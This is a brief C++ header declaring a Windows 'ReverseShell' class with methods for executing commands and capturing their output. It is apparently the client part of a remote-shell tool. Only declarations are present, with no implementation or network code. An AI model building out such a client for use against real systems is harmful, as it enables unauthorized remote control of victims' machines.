#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H

#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include <windows.h>

class ReverseShell {
private:
    std::string currentDirectory=".";
public:
    ReverseShell() = default;
    std::string executeCommand(const std::wstring&);
    int runCmd(const std::string &commandToExecute, std::string& outOutput);
};


#endif
